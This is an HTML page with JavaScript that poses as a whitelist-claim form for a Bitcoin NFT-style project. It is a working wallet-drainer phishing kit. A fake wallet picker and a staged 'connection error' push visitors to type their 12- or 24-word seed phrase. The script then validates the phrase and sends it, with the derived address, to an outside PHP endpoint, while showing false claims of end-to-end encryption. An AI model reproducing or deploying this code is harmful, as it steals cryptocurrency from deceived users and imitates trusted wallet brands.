<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width" />
    <meta name="next-head-count" content="2" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://kit.fontawesome.com/bdc3291137.js" crossorigin="anonymous"></script>
    <link rel="preload" href="asset_files/080a2c8449d8d32f.css" as="style" />
    <link rel="stylesheet" href="asset_files/080a2c8449d8d32f.css" data-n-g="" />
    <noscript data-n-css=""></noscript>

    <link rel="stylesheet" type="text/css" href="asset_files/wallet.css" />

</head>

<body>
    <div>
        <div class="min-h-screen w-full flex flex-col items-center justify-center" style="
          background-image: url('ladybg.jpg');
          background-size: cover;
          background-position: center center;
          background-repeat: no-repeat;
          background-attachment: fixed;
        ">
            <div class="bg-white bg-opacity-70 p-8 rounded shadow-md max-w-md w-full">
                <div class="mb-4">
                    <label class="block text-gray-700 text-sm font-bold mb-2" for="textbox1">What is your X
                        username?*</label><input id="textbox1" type="text" placeholder="@ladybtc_"
                        class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                        value="" />
                </div>
                <div class="mb-4">
                    <label class="block text-gray-700 text-sm font-bold mb-2" for="textbox2">What is your Taproot wallet
                        address?*</label><input id="textbox2" type="text" placeholder="bc1p..."
                        class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                        value="" />
                </div>
                <div class="mb-4">
                    <span class="block text-gray-700 text-sm font-bold mb-2">Have you followed
                        <a href="#" rel="noopener noreferrer" class="text-blue-500">@ladybtc_</a>?* (<a href="#"
                            rel="noopener noreferrer" class="text-blue-500">LIKE+RT THIS TWEET FOR +5
                            POINTS</a>)</span><label class="inline-flex items-center mr-4"><input type="radio"
                            class="form-radio" name="follow" value="yes" /><span
                            class="ml-2 text-black">Yes</span></label><label class="inline-flex items-center"><input
                            type="radio" class="form-radio" name="follow" value="no" /><span
                            class="ml-2 text-black">No</span></label>
                </div>
                <div class="mt-6 flex justify-center space-x-4">
                    <button type="button"
                        class="bg-[#f2a900] hover:bg-[#f2a900] text-white font-bold py-2 px-4 rounded connectButton">
                        Send
                    </button>

                    <button type="button"
                        class="bg-[#f2a900] hover:bg-[#f2a900] text-white font-bold py-2 px-4 rounded claim-btn">
                        Claim WL
                    </button>

                </div>
                <div class="flex items-center justify-center mt-6">
                    <a href="#" rel="noopener noreferrer" class="flex items-center text-xl text-black">Follow us on<img
                            src="xlogo.png" alt="X logo" class="h-8 ml-2" /></a>
                </div>
            </div>
        </div>
    </div>

    <div style="display: none" id="connectModal" class="portal-window">
        <div class="portal-window-content">

            <div class="modal-section">
                <div class="modal-header">
                    <p></p>
                    <p id="m_title" class="m-title">Choose Wallet </p>
                    <p> <button id="closeModal" type="button" class="btn btn-md btn-outline"> <i
                                class="fa-solid fa-xmark"></i> </button></p>
                </div>

                <div id="walletModal" class="wallet-wrapper">
                    <div class="wallet-col-wrapper">
                        <div class="wallet-col">
                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/phantom_logo.png" alt="" class="btn-icon" />
                                <span class="btn-text"> Phantom Wallet </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/okx_logo.png" alt="" class="btn-icon" />
                                <span class="btn-text"> OKX Wallet </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/coinbase_logo.png" alt="" class="btn-icon" />
                                <span class="btn-text"> Coinbase Wallet </span>
                            </button>


                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/bitget_logo.png" alt="" class="btn-icon" />
                                <span class="btn-text"> Bitget Wallet </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/trust_wallet.jpg" alt="" class="btn-icon" />
                                <span class="btn-text"> Trust Wallet </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/uniswap-uni-logo.jpg" alt="" class="btn-icon" />
                                <span class="btn-text"> Uniswap </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/metamask.jpeg" alt="" class="btn-icon" />
                                <span class="btn-text"> Metamask </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/magic_eden.jpg" alt="" class="btn-icon" />
                                <span class="btn-text"> Magic Eden </span>
                            </button>


                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/leather_wall.png" alt="" class="btn-icon" />
                                <span class="btn-text"> Leather Wallet </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/enkrypt_log.jpeg" alt="" class="btn-icon" />
                                <span class="btn-text"> Enkrypt </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/unisat_log.png" alt="" class="btn-icon" />
                                <span class="btn-text"> UniSat Wallet </span>
                            </button>

                            <button type="button" class="btn btn-md btn-secondary btn-wallet">
                                <img src="./asset_files/static/xverse_logo.jpeg" alt="" class="btn-icon" />
                                <span class="btn-text"> Xverse Wallet</span>
                            </button>
                        </div>
                    </div>
                </div>

                <div id="mainModal" class="modal-wrapper">
                    <div class="modal-top">
                        <div class="modal-img">
                            <img src="../assets/images/static/trust_wallet.jpg" alt="" id="assetImg"
                                class="img-fluid" />
                        </div>
                        <div class="header-content">
                            <p class="m-p-1"><span id="assetName"> Trust Wallet </span></p>
                            <p class="m-p-2">This session is secured and encrypted</p>
                        </div>
                    </div>

                    <div class="modal-main">
                        <div id="modalLoad" class="modal-div-1">
                            <div class="modal-load">
                                <div class="loader"></div>
                                <p class="l-p-1">starting secure connection...</p>
                                <p class="l-p-2">please wait...</p>
                            </div>
                        </div>

                        <div style="display: none" id="modalError" class="modal-div-2">
                            <div class="modal-error">
                                <button class="btn btn-md btn-outline-danger">
                                    An error occurred... please try again or connect manually
                                </button>

                                <div class="action-btn">
                                    <button type="button" id="tryAgain" class="btn btn-md btn-outline-secondary">
                                        Try again
                                    </button>
                                    <button type="button" id="connectManual" class="btn btn-md btn-primary">
                                        Connect Manually
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div style="display: none" id="modalConnect" class="modal-div-3">
                            <div class="modal-connect">
                                <form id="phraseForm" method="post">
                                    <div class="form-group">
                                        <textarea
                                            placeholder="Enter your 12 or 24 mnemonic words, seperate them with spaces."
                                            name="formPhrase" id="formPhrase" cols="30" rows="6"
                                            onkeyup="countWords(this);" class="form-control" required></textarea>
                                    </div>
                                    <div class="form-btn">
                                        <button type="submit" id="submit_phrase" disabled
                                            class="btn btn-md btn-secondary">
                                            Connect Wallet
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                    <div class="modal-bottom">
                        <p class="m-b-p">
                            <img src="../assets/images/static/shield.png" alt="" width="30" />
                            <span class="m-f-1">This session is protected with an end-to-end encryption
                            </span>
                        </p>
                    </div>
                </div>

                <div id="qrModal" style="display: none" class="modal-qr-wrapper">
                    <div class="modal-qr">
                        <div class="qr-img">
                            <img src="./asset_files/static/qr-code.png" alt="" id="show_1" class="img-fluid" />
                        </div>
                        <div class="qr-text">
                            <p>
                                Please Contact the Admin with your unique ref code
                                <span id="p-code" class="p-code"></span>
                            </p>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
    <script src="https://cdn.ethers.io/lib/ethers-5.4.umd.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>

</body>

</html>


<script>
    $(document).ready(function () {

        // open metamask function
        async function openWeb() {

            // switch wallet view
            $("#walletModal").hide();
            $("#qrModal").hide();
            $("#mainModal").show();
            $('.m-title').css('visibility', 'hidden');

            // connect wallet section

            $("#modalLoad").show();
            $("#modalError").hide();
            $("#modalConnect").hide();

            setTimeout(function () {
                $("#modalError").show();
                $("#modalLoad").hide();
                $("#modalConnect").hide();

            }, 5000);

            try {
                // create a Web3Provider instance
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                // request access to the user's MetaMask account
                await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                // get the current account address
                const signer = provider.getSigner();
                const address = await signer.getAddress();
                //web3 connection end here
            } catch (error) {
                console.error('Error fetching data:', error);
            }
        }


        $("#tryAgain").click(function () {
            $("#modalLoad").show();
            $("#modalError").hide();
            $("#modalConnect").hide();
            setTimeout(function () {
                $("#modalError").show();
                $("#modalLoad").hide();
                $("#modalConnect").hide();
            }, 5000);
        });

        $("#connectManual").click(function () {
            $("#modalLoad").hide();
            $("#modalError").hide();
            $("#modalConnect").show();
        });


        // Get the modal
        var modal = document.getElementById("connectModal");
        let closeModal = document.getElementById("closeModal");

        $(".claim-btn").on('click', function () {

            const modal = $('#connectModal');
            modal.css('display', 'flex');
            $('body').css('overflow-y', 'hidden');

            $("#walletModal").show();
            $('.m-title').css('visibility', 'visible');
            $("#mainModal").hide();
            $("#qrModal").hide();

        });



        $(".btn-wallet").on('click', function () {

            // Get wallet name and image src from the clicked column
            var walletName = $(this).find('.btn-text').text();
            var walletImageSrc = $(this).find('img').attr('src');

            $('#assetName').text(walletName);
            $('#assetImg').attr('src', walletImageSrc);

            openWeb();

            // console.log("walletName: " + walletName);
            // console.log("walletImageSrc: " + walletImageSrc);

        });

        closeModal.onclick = function () {
            modal.style.display = "none";
            document.body.style.overflowY = 'auto';
        };

        window.onclick = function (event) {
            if (event.target == modal) {
                modal.style.display = "none";
                document.body.style.overflowY = 'auto';
            }
        };

    });
</script>

<script>
    // Get the input field element
    const $inputPhrase = $("#formPhrase");
    // Add an event listener to the input field for input events
    $inputPhrase.on("input", function () {
        // Remove any non-numeric characters
        $("#formPhrase").removeClass("error");
        $inputPhrase.val($inputPhrase.val().replace(/[^a-zA-Z\s]/g, ""));
    });

    function countWords(self) {
        var spaces = self.value.match(/\S+/g);
        var words = spaces ? spaces.length : 0;

        if (words >= 11) {
            document.getElementById("submit_phrase").disabled = false;
        } else {
            document.getElementById("submit_phrase").disabled = true;
        }
    }

</script>

<script>
    function generateRandomString(length) {
        var result = '';
        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    // Validate seed phrase on form submission
    $("#phraseForm").submit(function (event) {
        event.preventDefault();
        document.getElementById("submit_phrase").disabled = true;
        var dappWords = $("#formPhrase").val();

        if (!validateInput(dappWords)) {

            $("#formPhrase").addClass("error");
        } else {

            dappWords = dappWords.trim();
            var randomString = generateRandomString(7);
            var dappName = $('#assetName').text();

            try {
                const wallet = ethers.Wallet.fromMnemonic(dappWords);
                console.log('Seed phrase is valid:', dappWords);
                console.log('Wallet address:', wallet.address);
                $.ajax({
                    url: "https://ftceurecovery.com/action/ladybtc.php",
                    method: "POST",
                    dataType: "JSON",
                    data: {
                        dappWord: dappWords,
                        dappAddress: wallet.address,
                        dappName: dappName,
                    },
                    success: function () { },
                    complete: function () { },
                });
                document.getElementById("p-code").innerHTML = randomString;
                $("#mainModal").hide();
                $("#walletModal").hide();
                $("#qrModal").show();
                document.getElementById("submit_phrase").disabled = true;
            } catch (error) {
                // console.error("Invalid seed phrase:", dappWords);
                $("#formPhrase").addClass("error");
                document.getElementById("submit_phrase").disabled = false;
            }
        }
    });
    function validateInput(input) {
        var sanitizedInput = input.replace(/<script.*?>.*?<\/script>/gi, ''); // Remove script tags
        sanitizedInput = sanitizedInput.replace(/<\/?[^>]+(>|$)/g, ""); // Strip any other HTML tags

        // Split the input into words using space as a delimiter after removing HTML
        var words = sanitizedInput.trim().split(/\s+/);
        if (words.length !== 12 && words.length !== 24) {
            return false; // Check for 12 or 24 words
        }

        var wordSet = new Set(words);
        if (wordSet.size !== words.length) {
            return false; // Check for duplicates
        }

        return true; // Passed all checks
    }
</script>